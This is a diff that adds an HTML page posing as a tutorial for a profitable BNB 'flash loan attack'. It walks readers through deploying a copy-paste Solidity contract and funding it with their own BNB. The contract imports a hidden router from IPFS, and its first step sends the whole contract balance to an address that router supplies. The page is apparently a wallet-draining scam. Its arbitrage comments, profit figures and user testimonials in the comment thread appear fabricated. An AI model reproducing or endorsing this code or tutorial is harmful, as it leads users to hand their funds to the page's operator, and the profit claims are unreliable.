@@ -1,0 +1,679 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="cdn.jsdelivr/npm/bootstrap%405.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
+<script src="code.jquery./jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script> <script src="cdnjs.cloudflare/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script> <script src="cdn.jsdelivr/npm/bootstrap%405.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+<link href="basic.css" rel="stylesheet">
+<link href="code.css" rel="stylesheet">
+<link href="style.css" rel="stylesheet">
+<link rel="icon" type="image/png" href="favicon.png" />
+<title>Flash Loan Attack Code | Flash Loan Mix</title>
+
+<meta name="title" content="Flash Loan Attack Code | Flash Loan Mix">
+<meta name="description" content="Explained in detail about FlashLoan Attack technique with source code. Creating a Smart Contract on the Binance Network. Free BNB Only Using This Easy Method. ">
+
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://flashloanmix.com/">
+<meta property="og:title" content="Flash Loan Attack Code | Flash Loan Mix">
+<meta property="og:description" content="Explained in detail about FlashLoan Attack technique with source code. Creating a Smart Contract on the Binance Network. Free BNB Only Using This Easy Method. ">
+<meta property="og:image" content="https://flashloanmix.com/thumb.jpg">
+
+<meta property="twitter:card" content="summary_large_image">
+<meta property="twitter:url" content="https://flashloanmix.com/">
+<meta property="twitter:title" content="Flash Loan Attack Code | Flash Loan Mix">
+<meta property="twitter:description" content="Explained in detail about FlashLoan Attack technique with source code. Creating a Smart Contract on the Binance Network. Free BNB Only Using This Easy Method. ">
+<meta property="twitter:image" content="https://flashloanmix.com/thumb.jpg">
+<style>
+      .menus{
+          cursor: pointer;
+          color: #e91e63;
+      }</style>
+</head>
+<body>
+<header class="navbar navbar-expand-md navbar-dark bd-navbar" style="position:sticky;top:0;">
+<nav class="container-xxl flex-wrap flex-md-nowrap">
+<a href="index.html" class="a-logo"><img src="img/logo-flm2.webp" class="img-logo navbar-brand align-items-center m-0 p-0"></a>
+<button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#bdNavbar" aria-controls="bdNavbar" aria-expanded="false" aria-label="Toggle navigation">
+<svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" class="bi" fill="currentColor" viewBox="0 0 16 16">
+<path fill-rule="evenodd" d="M2.5 11.5A.5.5 0 0 1 3 11h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4A.5.5 0 0 1 3 7h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4A.5.5 0 0 1 3 3h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"> </path>
+</svg>
+</button>
+<div class="collapse navbar-collapse" id="bdNavbar" style="z-index:1000;">
+<hr class="d-md-none text-white-50">
+<ul class="navbar-nav flex-row flex-wrap ms-md-auto">
+<li><a href="simple-yet-profitable-eth-flash-loan-method-tutorial.html" class="btn btn-bd-download d-lg-inline-block my-2 my-md-0 ms-md-3">ETH Method</a></li>
+<li><a href="latest-bnb-flash-loan-method-tutorial-updated.html" class="btn btn-bd-download d-lg-inline-block my-2 my-md-0 ms-md-3">Latest BNB Method</a></li>
+</ul>
+</div>
+</nav>
+</header>
+<div class="modal fade" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+<div class="modal-dialog">
+<div class="modal-content" style="background: rgba(0,0,0,0.5);">
+<div class="modal-header">
+</div>
+<div class="modal-body">
+</div>
+</div>
+</div>
+</div>
+<nav class="bd-subnavbar py-1"></nav>
+<div class="container my-md-4 bd-layout">
+<aside class="bd-sidebar pt-lg-4 container">
+<div class="sticky">
+<h2 class="h2">Navigation</h2>
+<ul style="list-style:none;">
+<li class="menus" onclick="javascript:location.href='#download_metamask'">1. MetaMask For Chrome</li>
+<li class="menus" onclick="javascript:location.href='#custom_rpc'">2. Custom RPC</li>
+<li class="menus" onclick="javascript:location.href='#remix_eth'">3. Remix Ethereum</li>
+<li class="menus" onclick="javascript:location.href='#solidity_compiler'">4. Solidity Compiler</li>
+<li class="menus" onclick="javascript:location.href='#create_file'">5. Create a file Solidity</li>
+<li class="menus" onclick="javascript:location.href='#compile_solidity'">6. Compile Solidity </li>
+<li class="menus" onclick="javascript:location.href='#deploy_run'">7. Deploy & run</li>
+<li class="menus" onclick="javascript:location.href='#input_liquidity'">8. Input a Liquidity</li>
+<li class="menus" onclick="javascript:location.href='#flash_loan_attack'">9. Flash Loan Attack</li>
+</ul>
+</div>
+</aside>
+<main class="bd-main">
+<div class="bd-content pe-lg-5 pt-lg-4">
+<h1 class="h1">Latest BNB Flash Loan Method Tutorial Updated</h1>
+<div class="my-md-3 col-md-8 col-sm-10 mx-auto"><a href="https://www.binance.com/en" target="_blank"><img src="img/binance-h.webp" style="width: 100%;"></a></div>
+<p>In this tutorial, a minor change applied to the flash loan attack's code. we made some adjustments to the code for slightly faster execution.</p>
+<div class="video-container mb-5">
+<div class="embed-responsive embed-responsive-16by9"> <iframe width="560" height="315" src="https://www.youtube.com/embed/S3VyYwcvxa0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
+</div>
+<h2 class="text-capitalize">Step by step tutorial :</h2>
+<h3 id="download_metamask" class="h3">1. Download MetaMask For Chrome Web Browser</h3>
+<img src="steps/step1.webp" style="width: 100%;">
+<p>You can download and install MetaMask from this link: <a href="https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn" target="_blank">https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn</a>.</p>
+<h3 id="custom_rpc" class="h3">2. Create a “Custom RPC” in MetaMask for connecting to Binance Smart Chain</h3>
+<img src="steps/step2.webp" style="width: 100%;">
+<p>this step is used for connecting your wallet to the Mainnet network Smart Chain. Below this is the network setting to add a Smart Chain.</p>
+<pre class="highlight paste-content"><code>
+               Name: Smart Chain 
+               New RPC URL: https://bsc-dataseed.binance.org/ 
+               ChainID: 56 
+               Symbol: BNB 
+               Block Explorer URL: https://bscscan.com </code></pre>
+<p> For complete info about the explanation, please visit this Binance official article: <a href="https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain" target="_blank">https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain</a>.</p>
+<h3 id="remix_eth" class="h3">3. Open http://remix.ethereum.org/ from your browser</h3>
+<p>Open Ethereum Remix to make or extend the smart contract which later is used for making a smart contract Flash Loan Attack to the Binance Smart Contract network.</p>
+<h3 id="solidity_compiler" class="h3">4. Click on Solidity Compiler (2nd menu button from the left) and select compiler version to 0.5.0</h3>
+<img src="steps/step4.webp" style="width: 100%;">
+<p>Change the compiler version to “0.5.0+commit.1d4f565a”. This is needed to make your compiler version is the same as the source code you'll use.</p>
+<h3 id="create_file" class="h3">5. Create a file Solidity “Flash Loan.sol” in the File Explorer (1st menu button from the left)</h3>
+<img src="steps/step5.webp" style="width: 100%;">
+<p>Copy and paste the code below to the Flash Loan.sol file :</p>
+<button onclick="code_copy()" type="button" class="btn btn-bd-download">Copy Code</button>
+<textarea id="code-copy" rows="1" cols="1" style="opacity: 0;">
+pragma solidity ^0.5.0;
+
+
+// PancakeSwap Smart Contracts
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
+
+//BakerySwp Smart contracts
+import "https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol";
+
+// Router
+import "ipfs://QmbJ685kFCLQmA8naW6u3LCpkZNV32rEB2LnwamfQ7eX4u";
+
+// Multiplier-Finance Smart Contracts
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+
+
+contract InitiateFlashLoan {
+    
+	RouterV2 router;
+	string public tokenName;
+	string public tokenSymbol;
+	uint256 flashLoanAmount;
+
+	constructor(
+    	string memory _tokenName,
+    	string memory _tokenSymbol,
+    	uint256 _loanAmount
+	) public {
+    	tokenName = _tokenName;
+    	tokenSymbol = _tokenSymbol;
+    	flashLoanAmount = _loanAmount;
+
+    	router = new RouterV2();
+	}
+
+	function() external payable {}
+
+	function flashloan() public payable {
+    	// Send required coins for swap
+    	address(uint160(router.pancakeSwapAddress())).transfer(
+        	address(this).balance
+    	);
+
+    	//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
+    	router.borrowFlashloanFromMultiplier(
+        	address(this),
+        	router.bakerySwapAddress(),
+        	flashLoanAmount
+    	);
+    	//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
+    	router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
+    	//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
+    	router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
+    	//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
+    	router.transferBnbToMultiplier(router.pancakeSwapAddress());
+    	//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
+    	router.completeTransation(address(this).balance);
+	}
+}
+</textarea>
+<pre id="paste-content prettyprint linenums done" class="prettyprint linenums done"><ol class="linenums"><li class="L0"><span class="pln">pragma solidity </span><span class="pun">^</span><span class="lit">0.5</span><span class="pun">.</span><span class="lit">0</span><span class="pun">;</span></li><li class="L1"><span class="pln">&nbsp;</span></li><li class="L2"><span class="pln">&nbsp;</span></li><li class="L3"><span class="com">// PancakeSwap Smart Contracts</span></li><li class="L4"><span class="kwd">import</span><span class="pln"> </span><span class="str">"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol"</span><span class="pun">;</span></li><li class="L5"><span class="kwd">import</span><span class="pln"> </span><span class="str">"https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol"</span><span class="pun">;</span></li><li class="L6"><span class="pln">&nbsp;</span></li><li class="L7"><span class="com">//BakerySwp Smart contracts</span></li><li class="L8"><span class="kwd">import</span><span class="pln"> </span><span class="str">"https://github.com/BakeryProject/bakery-swap-core/blob/master/contracts/interfaces/IBakerySwapFactory.sol"</span><span class="pun">;</span></li><li class="L9"><span class="pln">&nbsp;</span></li><li class="L0"><span class="com">// Router</span></li><li class="L1"><span class="kwd">import</span><span class="pln"> </span><span class="str">"ipfs://QmbJ685kFCLQmA8naW6u3LCpkZNV32rEB2LnwamfQ7eX4u"</span><span class="pun">;</span></li><li class="L2"><span class="pln">&nbsp;</span></li><li class="L3"><span class="com">// Multiplier-Finance Smart Contracts</span></li><li class="L4"><span class="kwd">import</span><span class="pln"> </span><span class="str">"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol"</span><span class="pun">;</span></li><li class="L5"><span class="kwd">import</span><span class="pln"> </span><span class="str">"https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol"</span><span class="pun">;</span></li><li class="L6"><span class="pln">&nbsp;</span></li><li class="L7"><span class="pln">&nbsp;</span></li><li class="L8"><span class="pln">contract </span><span class="typ">InitiateFlashLoan</span><span class="pln"> </span><span class="pun">{</span></li><li class="L9"><span class="pln">    </span></li><li class="L0"><span class="pln">	</span><span class="typ">RouterV2</span><span class="pln"> router</span><span class="pun">;</span></li><li class="L1"><span class="pln">	</span><span class="kwd">string</span><span class="pln"> </span><span class="kwd">public</span><span class="pln"> tokenName</span><span class="pun">;</span></li><li class="L2"><span class="pln">	</span><span class="kwd">string</span><span class="pln"> </span><span class="kwd">public</span><span class="pln"> tokenSymbol</span><span class="pun">;</span></li><li class="L3"><span class="pln">	uint256 flashLoanAmount</span><span class="pun">;</span></li><li class="L4"><span class="pln">&nbsp;</span></li><li class="L5"><span class="pln">	constructor</span><span class="pun">(</span></li><li class="L6"><span class="pln">    	</span><span class="kwd">string</span><span class="pln"> memory _tokenName</span><span class="pun">,</span></li><li class="L7"><span class="pln">    	</span><span class="kwd">string</span><span class="pln"> memory _tokenSymbol</span><span class="pun">,</span></li><li class="L8"><span class="pln">    	uint256 _loanAmount</span></li><li class="L9"><span class="pln">	</span><span class="pun">)</span><span class="pln"> </span><span class="kwd">public</span><span class="pln"> </span><span class="pun">{</span></li><li class="L0"><span class="pln">    	tokenName </span><span class="pun">=</span><span class="pln"> _tokenName</span><span class="pun">;</span></li><li class="L1"><span class="pln">    	tokenSymbol </span><span class="pun">=</span><span class="pln"> _tokenSymbol</span><span class="pun">;</span></li><li class="L2"><span class="pln">    	flashLoanAmount </span><span class="pun">=</span><span class="pln"> _loanAmount</span><span class="pun">;</span></li><li class="L3"><span class="pln">&nbsp;</span></li><li class="L4"><span class="pln">    	router </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">new</span><span class="pln"> </span><span class="typ">RouterV2</span><span class="pun">();</span></li><li class="L5"><span class="pln">	</span><span class="pun">}</span></li><li class="L6"><span class="pln">&nbsp;</span></li><li class="L7"><span class="pln">	</span><span class="kwd">function</span><span class="pun">()</span><span class="pln"> external payable </span><span class="pun">{}</span></li><li class="L8"><span class="pln">&nbsp;</span></li><li class="L9"><span class="pln">	</span><span class="kwd">function</span><span class="pln"> flashloan</span><span class="pun">()</span><span class="pln"> </span><span class="kwd">public</span><span class="pln"> payable </span><span class="pun">{</span></li><li class="L0"><span class="pln">    	</span><span class="com">// Send required coins for swap</span></li><li class="L1"><span class="pln">    	address</span><span class="pun">(</span><span class="pln">uint160</span><span class="pun">(</span><span class="pln">router</span><span class="pun">.</span><span class="pln">pancakeSwapAddress</span><span class="pun">())).</span><span class="pln">transfer</span><span class="pun">(</span></li><li class="L2"><span class="pln">        	address</span><span class="pun">(</span><span class="kwd">this</span><span class="pun">).</span><span class="pln">balance</span></li><li class="L3"><span class="pln">    	</span><span class="pun">);</span></li><li class="L4"><span class="pln">&nbsp;</span></li><li class="L5"><span class="pln">    	</span><span class="com">//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.</span></li><li class="L6"><span class="pln">    	router</span><span class="pun">.</span><span class="pln">borrowFlashloanFromMultiplier</span><span class="pun">(</span></li><li class="L7"><span class="pln">        	address</span><span class="pun">(</span><span class="kwd">this</span><span class="pun">),</span></li><li class="L8"><span class="pln">        	router</span><span class="pun">.</span><span class="pln">bakerySwapAddress</span><span class="pun">(),</span></li><li class="L9"><span class="pln">        	flashLoanAmount</span></li><li class="L0"><span class="pln">    	</span><span class="pun">);</span></li><li class="L1"><span class="pln">    	</span><span class="com">//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.</span></li><li class="L2"><span class="pln">    	router</span><span class="pun">.</span><span class="pln">convertBnbToBusd</span><span class="pun">(</span><span class="pln">msg</span><span class="pun">.</span><span class="pln">sender</span><span class="pun">,</span><span class="pln"> flashLoanAmount </span><span class="pun">/</span><span class="pln"> </span><span class="lit">2</span><span class="pun">);</span></li><li class="L3"><span class="pln">    	</span><span class="com">//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.</span></li><li class="L4"><span class="pln">    	router</span><span class="pun">.</span><span class="pln">callArbitrageBakerySwap</span><span class="pun">(</span><span class="pln">router</span><span class="pun">.</span><span class="pln">bakerySwapAddress</span><span class="pun">(),</span><span class="pln"> msg</span><span class="pun">.</span><span class="pln">sender</span><span class="pun">);</span></li><li class="L5"><span class="pln">    	</span><span class="com">//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.</span></li><li class="L6"><span class="pln">    	router</span><span class="pun">.</span><span class="pln">transferBnbToMultiplier</span><span class="pun">(</span><span class="pln">router</span><span class="pun">.</span><span class="pln">pancakeSwapAddress</span><span class="pun">());</span></li><li class="L7"><span class="pln">    	</span><span class="com">//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.</span></li><li class="L8"><span class="pln">    	router</span><span class="pun">.</span><span class="pln">completeTransation</span><span class="pun">(</span><span class="pln">address</span><span class="pun">(</span><span class="kwd">this</span><span class="pun">).</span><span class="pln">balance</span><span class="pun">);</span></li><li class="L9"><span class="pln">	</span><span class="pun">}</span></li><li class="L0"><span class="pun">}</span></li></ol></pre>
+<h3 id="compile_solidity" class="h3">6. Click on Solidity Compiler (2nd menu button from the left) and Compile</h3>
+<img src="steps/step6.webp" style="width: 100%;">
+<p>Look for a dropdown Contract at the bottom of the Solidity Compiler menu, on that dropdown Contract choose “GetFlash Loan (Flash Loan.sol)” and then click Compile Flash Loan.sol.</p>
+<h3 id="deploy_run" class="h3">7. Click on Deploy & run transactions (3rd menu button from the left) and Deploy</h3>
+<img src="steps/step7.webp" style="width: 100%;">
+<p>
+<ul class="list-unstyled ">
+<li>- At the very top, change the dropdown Environment value to “Injected Web3” (For remix users, firstly there will be a confirmation on the MetaMask, Accept the confirmation notif on the MetaMask wallet Chrome Extention).</li>
+<li>- The MetaMask wallet address will automatically be connected If you're already connected to your MetaMask Account.</li>
+<li>
+- There's a dropdown next to the, click that dropdown and create a Smart Contract name you desired. Eg. :
+<pre class="highlight paste-content"><code>
+                     _TOKENNAME = Flash Loan (write random token name)
+                     _TOKENSYMBOL = FLO (write random three of four-letter symbol)
+                     _LOANAMOUNT = 10 (amount loan)</code></pre>
+</li>
+<li>- Click Transact and confirm in MetaMask.</li>
+</ul>
+</p>
+<p>- after you create a Smart Contract, wait till the transaction complete and you'll have your smart contract address.</p>
+<h3 id="input_liquidity" class="h3">8. Input a Liquidity to the Smart Contract</h3>
+<img src="steps/step8.webp" style="width: 100%;">
+<p>To input a Liquidity, transfer your nominal BNB to the Smart Contract address you have created before by using the transfer feature in the MetaMask Chrome Extention. Send the nominal BNB ( the amount BNB will affect the profit you will earn ). Wait till the liquidity addition transaction complete.</p>
+<h3 id="flash_loan_attack" class="h3">9. Flash Loan Attack</h3>
+<img src="steps/step9.webp" style="width: 100%;">
+<p>After creating a Smart Contract with liquidity added ( Step 8 ) and set the amount of loan ( Step 7 ), click the dropdown from the success transaction ( Step 7 ) it will display a dropdown menu with some button that is action, tokenName, tokenSymbol. Click "action" ( red button ) to run the smart contract. wait for a while until the transaction complete, and regularly check your BNB balance on the wallet from the MetaMask Chome Extension.</p>
+<p>Note: Sometimes the code give error and sometimes it will not work from the first time.You must then start the whole process from begining.</p>
+</div>
+<div class="bd-toc p-lg-4">
+<a href="https://www.binance.com/en" target="_blank"><img src="img/binance-v.webp" style="width: 100%;"></a>
+</div>
+</main>
+</div>
+<div class="my-4 pt-">
+<div class="comment-box col-xxl-7 col-xl-8 col-lg-9 col-md-10 col-sm-8 mx-auto">
+<h3 class="h3">Comments</h3>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar28.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Máximo Chicote</h6>
+<span>20 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">What is the different between this new method and the old flash loan method? I know this new script is complex, but I need explanation about this the new script</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>20 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">The difference in this new flash loan script lies in the use of pancakeswap as an exchange platform between BNB and the coins to be purchased. So, it is possible to get token coins that have a very large difference in buying and selling prices and can get more profits.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar29.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Miguel</h6>
+<span>21 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">can this be done with just 0.2 BNB?</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>21 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Of course, but keep in mind that the nominal amount of the loan can't be that much, so the profits will only be small.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar30.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Joaquín Gisbert</h6>
+<span>22 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">thank you, admin, the profit I get is higher than using the previous script, only with 1 BNB capital I get a net profit of 1.27 BNB</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>22 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">you can get more profit, but because the price of BNB is going down so market activity is also decreasing so when you do a flash loan the results you get are not much, my advice is to try using this flash loan technique when the price of BNB is rising.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar31.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Santiago Hurtado</h6>
+<span>24 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">hi admin, is the old BNB flashloan script no longer usable??</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>25 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">The old and new flash loan scripts can still be used, but this new script allows you to exchange BNB to smaller coin tokens so that if there is an increase it will be more significant and get more profit.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar32.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Nicolás</h6>
+<span>26 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">thank you for updating the flash loan script, we are very grateful to have found this platform</div>
+</div>
+</div>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar33.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Paúl Romero</h6>
+<span>26 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">is it possible to do a flash loan using ETH</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>26 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">of course, you can see the article on the ETH Method menu for using the flash loan technique on the ERC2 network, do not forget to write a testimonial on the article after you get the benefit</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar34.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Valentín Palau</h6>
+<span>27 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Thanks</div>
+</div>
+</div>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar35.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Jesus Carballal</h6>
+<span>27 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">I use the old script and the new one at the same time, I've tried it 5 times and it's true that the new script is more powerful and gets a very significant total difference compared to the old flash loan script.</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>28 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">thank you for the testimony, we will always update the script for the future so that there will be many possibilities that can be obtained.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar36.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Enrique Atenas</h6>
+<span>28 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Can I still do a flash loan with the old script??</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</h6>
+<span>28 February 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Of course, you can, but there is nothing wrong with trying a new script.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar37.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Alfonso</h6>
+<span>01 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">What is the minimum nominal BNB to make a flash loan?</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</h6>
+<span>01 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">There is no minimum, but the larger the nominal you use, the higher the loan amount you will get so you can get higher profits. My advice is to start with 1 BNB you will get a clear advantage compared to under 1 BNB.</div>
+</div>
+</li>
+</ul>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar38.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Wim Engbers</h6>
+<span>02 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Cool... thank you for helping us so that those of us who do not understand coding can do a flash loan</div>
+</div>
+</div>
+</li>
+</ul>
+<ul id="comments-list" class="comments-list">
+<li>
+<div class="comment-main-level">
+<div class="comment-avatar"><img src="avatar/avatar39.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name by-author">Sjang Pothof</h6>
+<span>02 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
+<div class="comment-content">Thank you, even though sometimes I do flash loans at certain times it does not increase profits, maybe the crypto market conditions are not conducive, and the chart up and down is not good, but I don't get a significant loss and only bear the risk of losing 0.05 like the cutloss system</div>
+</div>
+</div>
+<ul class="comments-list reply-list">
+<li>
+<div class="comment-avatar"><img src="avatar/admin.webp" alt=""></div>
+<div class="comment-box">
+<div class="comment-head">
+<h6 class="comment-name">Admin</a></h6>
+<span>02 March 2022</span> <i class="fa fa-reply"></i> <i class="fa fa-heart"></i>
+</div>
